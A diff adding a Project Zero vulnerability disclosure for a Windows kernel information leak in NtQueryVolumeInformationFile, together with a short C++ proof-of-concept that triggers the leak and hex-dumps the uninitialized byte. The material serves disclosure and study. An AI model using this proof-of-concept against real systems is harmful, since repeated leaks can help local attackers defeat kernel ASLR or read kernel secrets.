@@ -1,0 +1,106 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1166
+
+We have discovered that the nt!NtQueryVolumeInformationFile system call discloses portions of uninitialized pool memory to user-mode clients, due to output structure alignment holes.
+
+On our test Windows 10 32-bit workstation, an example layout of the output buffer is as follows:
+
+--- cut ---
+00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000010: 00 ff ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ................
+--- cut ---
+
+Where 00 denote bytes which are properly initialized, while ff indicate uninitialized values copied back to user-mode. The output data is returned in a FILE_FS_VOLUME_INFORMATION structure [1]. If we map the above shadow bytes to the structure definition, it turns out that the uninitialized byte corresponds to an alignment hole after the SupportsObjects field.
+
+The issue can be reproduced by running the attached proof-of-concept program on a system with the Special Pools mechanism enabled for ntoskrnl.exe. Then, it is clearly visible that bytes at the aforementioned offsets are equal to the markers inserted by Special Pools, and would otherwise contain leftover data that was previously stored in that memory region:
+
+--- cut ---
+00000000: e7 5e f6 a6 e3 38 d1 01 25 1d a9 2e 00 00 00 00 .^...8..%.......
+00000010: 01[84]?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ................
+--- cut ---
+00000000: e7 5e f6 a6 e3 38 d1 01 25 1d a9 2e 00 00 00 00 .^...8..%.......
+00000010: 01[ff]?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ................
+--- cut ---
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+
+This bug is subject to a 90 day disclosure deadline. After 90 days elapse or a patch has been made broadly available, the bug report will become visible to the public.
+*/
+
+#include <Windows.h>
+#include <winternl.h>
+#include <cstdio>
+
+typedef enum  {
+  FileFsVolumeInformation = 1,
+  FileFsLabelInformation = 2,
+  FileFsSizeInformation = 3,
+  FileFsDeviceInformation = 4,
+  FileFsAttributeInformation = 5,
+  FileFsControlInformation = 6,
+  FileFsFullSizeInformation = 7,
+  FileFsObjectIdInformation = 8,
+  FileFsDriverPathInformation = 9,
+  FileFsVolumeFlagsInformation = 10,
+  FileFsSectorSizeInformation = 11
+} FS_INFORMATION_CLASS;
+
+extern "C"
+NTSTATUS WINAPI NtQueryVolumeInformationFile(
+  _In_  HANDLE               FileHandle,
+  _Out_ PIO_STATUS_BLOCK     IoStatusBlock,
+  _Out_ PVOID                FsInformation,
+  _In_  ULONG                Length,
+  _In_  FS_INFORMATION_CLASS FsInformationClass
+  );
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+int main() {
+  // Open the disk device.
+  HANDLE hDisk = CreateFile(L"C:\\", 0, 0, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
+  if (hDisk == INVALID_HANDLE_VALUE) {
+    printf("CreateFile failed, %d\n", GetLastError());
+    return 1;
+  }
+
+  // Obtain the output data, assuming that it will fit into 256 bytes.
+  BYTE output[256];
+  IO_STATUS_BLOCK iosb;
+  NTSTATUS st = NtQueryVolumeInformationFile(hDisk, &iosb, output, sizeof(output), FileFsVolumeInformation);
+  if (!NT_SUCCESS(st)) {
+    printf("NtQueryVolumeInformationFile failed, %x\n", st);
+    CloseHandle(hDisk);
+    return 1;
+  }
+
+  // Dump the output data on screen and free resources.
+  PrintHex(output, iosb.Information);
+  CloseHandle(hDisk);
+
+  return 0;
+}
